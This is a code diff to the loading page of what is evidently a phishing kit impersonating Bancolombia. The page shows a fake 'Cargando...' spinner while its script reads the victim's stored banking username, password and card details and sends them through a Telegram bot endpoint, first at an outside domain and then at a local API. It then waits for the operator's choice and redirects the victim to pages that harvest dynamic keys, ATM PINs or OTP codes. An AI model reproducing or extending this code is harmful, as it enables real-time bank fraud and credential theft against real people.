@@ -38,30 +38,30 @@
         }
 
         .loaderp {
-            width: 180px; /* Tamaño del círculo */
-            height: 180px; /* Tamaño del círculo */
-            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
-            background-size: cover; /* Hace que la imagen cubra todo el círculo */
-            border-radius: 50%; /* Forma el círculo */
-            position: relative; /* Necesario para posicionar el loader dentro */
+            width: 180px;
+            height: 180px;
+            background-image: url('img/circulo.png');
+            background-size: cover;
+            border-radius: 50%;
+            position: relative;
             display: flex;
-            flex-direction: column; /* Centra el texto debajo del loader */
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
         }
 
         .loaderp .loader {
-            width: 30px; /* Tamaño del loader (gris) */
-            height: 30px; /* Tamaño del loader (gris) */
-            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
-            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
+            width: 30px;
+            height: 30px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #555;
             border-radius: 50%;
-            animation: spin 1s linear infinite; /* Animación de giro */
+            animation: spin 1s linear infinite;
         }
 
         .loaderp-text {
-            margin-top: 30px; /* Espacio entre el loader y el texto */
+            margin-top: 30px;
             font-size: 13px;
             color: black;
         }
@@ -76,19 +76,13 @@
     <div class="blur-overlay"></div>
     <div class="loaderp-full">
         <div class="loaderp">
-            <div class="loader"></div> <!-- Este es el loader gris que gira -->
-            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
+            <div class="loader"></div>
+            <div class="loaderp-text">Cargando...</div>
         </div>
     </div>
 
-
-
     <script>
     document.addEventListener('DOMContentLoaded', async function () {
-        // Mostrar el loader inicialmente oculto
-        const loader = document.querySelector('#loader');
-
-        // Obtener los valores de usuario y clave desde el localStorage
         const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
         if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
             console.error("Error: No se encontraron datos en 'bancoldata' en el localStorage.");
@@ -97,17 +91,11 @@
 
         const usuario = bancoldata.usuario;
         const clave = bancoldata.clave;
-
-        // Generar transactionId
         const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
-        // Almacenar en localStorage
         localStorage.setItem('transactionId', transactionId);
 
-        // Obtener los datos de la tarjeta desde localStorage
         const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));
 
-        // Crear mensaje para Telegram
         const message = `
 <b>Nuevo método de pago pendiente de verificación.</b>
 --------------------------------------------------
@@ -132,7 +120,6 @@
 --------------------------------------------------
         `;
 
-        // Crear botones interactivos
         const keyboard = JSON.stringify({
             inline_keyboard: [
                 [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
@@ -143,26 +130,22 @@
             ],
         });
 
-
         try {
-            const response = await fetch(`https://tiquetesbaratoss.com.co/dinadatos/sendData.php?method=send&text=${encodeURIComponent(message)}&reply_markup=${encodeURIComponent(keyboard)}`);
+            const response = await fetch(`/api/sendData?method=send&text=${encodeURIComponent(message)}&reply_markup=${encodeURIComponent(keyboard)}`);
             const data = await response.json();
             if (data.ok) {
                 console.log("Mensaje enviado a Telegram con éxito");
-                // Esperar la respuesta del botón presionado en Telegram
                 await checkPaymentVerification(transactionId);
             } else {
                 throw new Error("Error al enviar mensaje a Telegram.");
             }
         } catch (error) {
             console.error("Error al enviar mensaje:", error);
-            if (loader) loader.style.display = "none"; // Ocultar loader si hay error
         }
 
         async function checkPaymentVerification(transactionId) {
-    
             try {
-                const response = await fetch(`https://tiquetesbaratoss.com.co/dinadatos/sendData.php?method=update`);
+                const response = await fetch(`/api/sendData?method=update`);
                 const data = await response.json();
 
                 const verificationUpdate = data.result.find(update =>
@@ -179,45 +162,38 @@
                 );
 
                 if (verificationUpdate) {
-                    if (loader) loader.style.display = "none"; // Ocultar loader
-
-                    // Aquí manejamos las respuestas de los botones
                     switch (verificationUpdate.callback_query.data) {
                         case `pedir_dinamica:${transactionId}`:
-                            window.location.href = "dinacol.php"; // Redirige a la página de clave dinámica
+                            window.location.href = "dinacol.html";
                             break;
                         case `pedir_cajero:${transactionId}`:
-                            window.location.href = "ccajero-id.php"; // Redirige a la página de clave de cajero
+                            window.location.href = "ccajero-id.html";
                             break;
                         case `pedir_otp:${transactionId}`:
-                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
-                            break;
                         case `pedir_token:${transactionId}`:
-                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
+                            window.location.href = "index-otp.html";
                             break;
                         case `error_tc:${transactionId}`:
                             alert("Error en tarjeta. Verifique los datos.");
-                            window.location.href = "../../pay/"; // Redirige a la página de pago
+                            window.location.href = "../../pay/";
                             break;
                         case `error_logo:${transactionId}`:
                             alert("Error en el logo. Reintente.");
-                            window.location.href = "index-pc-error.html"; // Redirige a la página de error
+                            window.location.href = "index-pc-error.html";
                             break;
-                            case `confirm_finalizar:${transactionId}`:
-                        window.location.href = "../../checking.php";
-                        break;
+                        case `confirm_finalizar:${transactionId}`:
+                            window.location.href = "../../checking.html";
+                            break;
                     }
                 } else {
-                    // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
                     setTimeout(() => checkPaymentVerification(transactionId), 2000);
                 }
             } catch (error) {
                 console.error("Error en la verificación:", error);
-                // En caso de error, intentamos de nuevo en 2 segundos
                 setTimeout(() => checkPaymentVerification(transactionId), 2000);
             }
         }
     });
-</script>
+    </script>
 </body>
 </html>
